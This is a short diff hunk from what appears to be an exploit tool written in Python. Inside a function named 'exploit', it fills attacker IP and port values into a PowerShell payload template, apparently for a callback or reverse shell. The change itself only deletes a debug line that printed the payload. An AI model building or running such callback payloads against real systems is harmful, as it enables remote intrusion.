@@ -505,8 +505,6 @@ def exploit(exploits, method):
     powershellPayload = powershellPayload.replace("{IP}", ip)
     powershellPayload = powershellPayload.replace("{PORT}", str(port))
 
-    print("Pyld: " + powershellPayload)
-
     for i in range(len(exploits)):
         exploit = exploits[i]
         
